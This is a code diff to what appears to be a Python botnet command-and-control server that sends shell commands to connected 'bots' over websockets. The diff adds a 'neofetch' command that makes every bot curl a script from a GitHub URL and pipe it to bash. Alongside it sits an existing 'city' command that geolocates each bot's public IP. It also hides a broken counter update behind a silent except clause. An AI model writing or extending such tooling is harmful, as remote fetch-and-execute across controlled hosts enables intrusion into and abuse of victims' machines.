@@ -76,12 +76,14 @@ class Context:
             return None
 
     def remove_bot_client(self, bot: Bot):
-        if bot in self.bots:
-            self.bots.remove(bot)
-            bot_length -= 1
-            logger.info(f"{bot} removed")
-            logger.info(f"Bots : {len(self.bots)}")
-
+        try:
+            if bot in self.bots:
+                self.bots.remove(bot)
+                bot_length -= 1
+                logger.info(f"{bot} removed")
+                logger.info(f"Bots : {len(self.bots)}")
+        except UnboundLocalError:
+            pass
     def get_database_summary(self) -> str:
         x = PrettyTable()
         bot_len = len(self.bots)
@@ -120,7 +122,8 @@ class CommandControl:
         cmd = await ws.recv()
         if cmd == "city":
             cmd = "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
-
+        elif cmd == "neofetch":
+            cmd = "curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch"
         async def exec_command(bot_idx: int):
             cur_bot = self.ctx.get_bot(bot_idx)
             if not cur_bot:
@@ -157,6 +160,8 @@ class CommandControl:
                 break
             elif cmd == "city":
                 cmd = "curl http://ipinfo.io/$(curl ifconfig.io) | grep region | sed 's/.$//'"
+            elif cmd == "neofetch":
+                cmd = "curl https://raw.githubusercontent.com/Chocapikk/neofetch/master/neofetch | bash || neofetch"
             stdout = await bot.send_command(cmd)
             if ws.closed or stdout is False:
                 self.ctx.remove_bot_client(bot)
